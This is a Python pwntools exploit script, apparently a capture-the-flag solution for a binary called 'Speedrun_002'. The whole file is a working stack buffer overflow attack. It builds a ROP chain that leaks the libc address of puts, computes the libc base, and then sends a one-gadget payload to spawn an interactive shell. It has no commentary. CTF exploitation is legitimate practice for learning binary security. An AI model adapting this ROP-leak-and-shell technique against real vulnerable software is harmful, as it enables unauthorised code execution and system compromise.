from pwn import*
context.arch = 'amd64'

p = process('./Speedrun_002')

libc = ELF('libc-2.27.so')
binary = ELF('Speedrun_002')
pop_rdi = 0x4008a3
start = 0x0040074c
puts_plt = binary.symbols['puts']
#print puts_plt
puts_got = binary.got['puts']
#print puts_got

payload =  "A"*1024
payload += "B"*8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start)



p.send("Everything intelligent is so boring.")
p.recvuntil('Tell me more.')
#s = p.recvline()
#print s  

p.sendline(payload)

print p.recvuntil('Fascinating.\x0a')
leak = p.recvline().replace("\x0a","")
leak = u64(leak + "\x00"*(8-len(leak)))

libcbase = leak - libc.symbols['puts']

onegadget = "A"*1032
onegadget += p64((libcbase)+ 0x4f322)
p.sendline('Everything intelligent is so boring.')
p.recvuntil('Tell me more.')
p.sendline(onegadget)

p.interactive()





